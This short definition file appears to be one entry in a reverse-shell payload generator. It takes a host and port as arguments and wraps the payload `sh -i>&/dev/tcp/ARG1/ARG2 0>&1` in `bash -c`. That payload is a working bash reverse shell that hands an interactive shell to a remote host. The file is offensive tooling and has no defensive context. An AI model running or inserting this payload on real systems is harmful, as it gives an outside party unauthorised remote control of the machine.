
USAGE = 'host port'
NARGS = [2, 2]
LANG = 'bash'
EXEC = '''
bash -c 'PAYLOAD'
'''

pl = '''
sh -i>&/dev/tcp/ARG1/ARG2 0>&1
'''
